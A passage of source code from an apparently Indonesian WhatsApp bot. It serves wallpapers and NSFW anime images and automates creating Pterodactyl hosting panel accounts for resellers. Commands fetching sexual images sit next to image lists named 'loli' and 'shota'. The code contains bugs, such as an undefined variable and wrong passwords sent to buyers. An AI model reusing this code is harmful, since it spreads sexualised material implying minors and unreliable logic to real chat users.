cay.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllll.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/wallml.json'))
var llllllllllll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllllll.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/wallhp.json'))
var lllllllllllll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllllll.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hentai':
case 'hneko' :
//if (!isRegistered) return registerbut(noregis)
   let waifudd22 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
cay.sendMessage(m.chat, { caption: "done by asumma", image: { url:waifudd2.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
//if (!isRegistered) return registerbut(noregis)
reply('matte kudasai (눈‸눈)')
  let waifudd3 = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
cay.sendMessage(m.chat, { caption: "done by asumma", image: { url:waifudd3.data.url } }, { quoted: m })
break
case 'gasm':
//if (!isRegistered) return registerbut(noregis)
reply('matte kudasai (눈‸눈)')						
 let waifudd4 = await axios.get(`https://nekos.life/api/v2/img/${command}`)
cay.sendMessage(m.chat, { caption: "done by asumma", image: { url:waifudd4.data.url } }, { quoted: m })
break  
case 'milf':
//if (!isRegistered) return registerbut(noregis)
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/milf.json'))
var kymyresult = pickRandom(ahegaonsfw)
cay.sendMessage(m.chat, { caption: "done by asumma", image: { url: kymyresult.url } }, { quoted: m })
break 
case 'animespank':				
	//if (!isRegistered) return registerbut(noregis)
 let waifudd5 = await await axios.get(`https://nekos.life/api/v2/img/spank`)     
             cay.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd5.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break











case "cpanel3": case "addpanel3": case "buatpanel3": {
if (!isOwner && !isReseller) return reply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("nama,6283XXX"))
if (!text.split(",")) return m.reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return m.reply(example("nama,6283XXX"))
var ceknyaa = text.split(",")[1]
if (!ceknyaa) return m.reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await cay.onWhatsApp(ceknyaa)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
global.panel3 = [buyyer, client]
let teksnya = "Silahkan Pilih Ram Server Panel"
let u = `*\`</> 乂${command}乂 </>\`*\n`
let dits = ``
let mmm = ``
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363357312070270@newsletter',
			newsletterName: 'Hutao Cpanel2 otomatis', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: cay.decodeJid(cay.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: 'Hutao cpanel otomatis', 
 thumbnailUrl: 'https://files.catbox.moe/v29m2w.jpg', 
 sourceUrl: 'https://t.me/caywzzneh',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `*\`</> 乂${command}乂 </>\`*`,
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [ 
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Silahkan Pilih Ram Server Panel!`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/v29m2w.jpg" } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunliv3" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gbv3" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gbv3" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gbv3" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gbv3" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gbv3" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gbv3" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gbv3" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gbv3" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gbv3" }, 
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 220%", "id": ".cp10gbv3" }]}]}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: qtext2 })
cay.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break

case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cp10gb": case "cp11gb": case "cp12gb": case "cp13gb": case "cp14gb": case "cp15gb": case "cp16gb": case "cp17gb": case "cp18gb": case "cp19gb": case "cp20gb": case "cp21gb": case "cp22gb": case "cp23gb": case "cp24gb": case "cp25gb": case "cp26gb": case "cp27gb": case "cp28gb": case "cp29gb": case "cp30gb": case "cp31gb": case "cp32gb": case "cp33gb": case "cp34gb": case "cp35gb": case "cp36gb": case "cp37gb": case "cp38gb": case "cp39gb": case "cp40gb": case "cp41gb": case "cp42gb": case "cp43gb": case "cp44gb": case "cp45gb": case "cp46gb": case "cp47gb": case "cp48gb": case "cp49gb": case "cp50gb": case "cpunli": {
if (!isOwner && !isReseller) return reply(msg.owner)
if (global.panel == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else if (command == "cp16gb") {
ram = "16125"
disknya = "16125"
cpu = "510"
} else if (command == "cp17gb") {
ram = "17125"
disknya = "17125"
cpu = "540"
} else if (command == "cp18gb") {
ram = "18125"
disknya = "18125"
cpu = "570"
} else if (command == "cp19gb") {
ram = "19125"
disknya = "19125"
cpu = "600"
} else if (command == "cp20gb") {
ram = "20125"
disknya = "20125"
cpu = "630"
} else if (command == "cp21gb") {
ram = "21125"
disknya = "21125"
cpu = "660"
} else if (command == "cp22gb") {
ram = "22125"
disknya = "22125"
cpu = "660"
} else if (command == "cp23gb") {
ram = "23125"
disknya = "23125"
cpu = "690"
} else if (command == "cp24gb") {
ram = "24125"
disknya = "24125"
cpu = "720"
} else if (command == "cp25gb") {
ram = "25125"
disknya = "25125"
cpu = "750"
} else if (command == "cp26gb") {
ram = "26125"
disknya = "26125"
cpu = "780"
} else if (command == "cp27gb") {
ram = "27125"
disknya = "27125"
cpu = "810"
} else if (command == "cp28gb") {
ram = "28125"
disknya = "28125"
cpu = "840"
} else if (command == "cp29gb") {
ram = "29125"
disknya = "29125"
cpu = "870"
} else if (command == "cp30gb") {
ram = "30125"
disknya = "30125"
cpu = "900"
} else if (command == "cp31gb") {
ram = "31125"
disknya = "31125"
cpu = "930"
} else if (command == "cp32gb") {
ram = "32125"
disknya = "32125"
cpu = "960"
} else if (command == "cp33gb") {
ram = "33125"
disknya = "33125"
cpu = "990"
} else if (command == "cp34gb") {
ram = "34125"
disknya = "34125"
cpu = "1020"
} else if (command == "cp35gb") {
ram = "35125"
disknya = "35125"
cpu = "1050"
} else if (command == "cp36gb") {
ram = "36125"
disknya = "35125"
cpu = "1080"
} else if (command == "cp37gb") {
ram = "37125"
disknya = "37125"
cpu = "1110"
} else if (command == "cp38gb") {
ram = "38125"
disknya = "38125"
cpu = "1240"
} else if (command == "cp39gb") {
ram = "39125"
disknya = "39125"
cpu = "1270"
} else if (command == "cp40gb") {
ram = "40125"
disknya = "40125"
cpu = "1200"
} else if (command == "cp41gb") {
ram = "41125"
disknya = "41125"
cpu = "1230"
} else if (command == "cp42gb") {
ram = "42125"
disknya = "42125"
cpu = "1260"
} else if (command == "cp43gb") {
ram = "43125"
disknya = "43125"
cpu = "1290"
} else if (command == "cp44gb") {
ram = "44125"
disknya = "44125"
cpu = "1320"
} else if (command == "cp45gb") {
ram = "45125"
disknya = "45125"
cpu = "1350"
} else if (command == "cp46gb") {
ram = "46125"
disknya = "46125"
cpu = "1380"
} else if (command == "cp47gb") {
ram = "47125"
disknya = "47125"
cpu = "1410"
} else if (command == "cp48gb") {
ram = "48125"
disknya = "48125"
cpu = "1440"
} else if (command == "cp49gb") {
ram = "49125"
disknya = "49125"
cpu = "1470"
} else if (command == "cp50gb") {
ram = "50125"
disknya = "50125"
cpu = "1500"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isReseller) return reply(msg.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Hutao.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Data Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `${monospace('Chat Privat data Panel')}

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 」
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(global.temppw.toString())}
 │• 🔗 _LOGIN_ : ${global.domain}
 ╰────`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`*/
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await cay.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break

case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{

let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
cay.sendMessage(m.chat, { image: { url: yeha }, caption : "Done" }, { quoted: m })
}
break
//powered by Hutao
case "cp1gbv2": case "cp2gbv2": case "cp3gbv2": case "cp4gbv2": case "cp5gbv2": case "cp6gbv2": case "cp7gbv2": case "cp8gbv2": case "cp9gbv2": case "cp10gbv2": case "cpunliv2": {
if (global.tempuser == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv2") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv2") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv2") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv2") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv2") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv2") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv2") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv2") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv2") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv2") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isReseller) return reply(msg.owner)
let username = global.tempuser.toLowerCase()
let email = username+"@Hutao.com"
let name = capital(username)
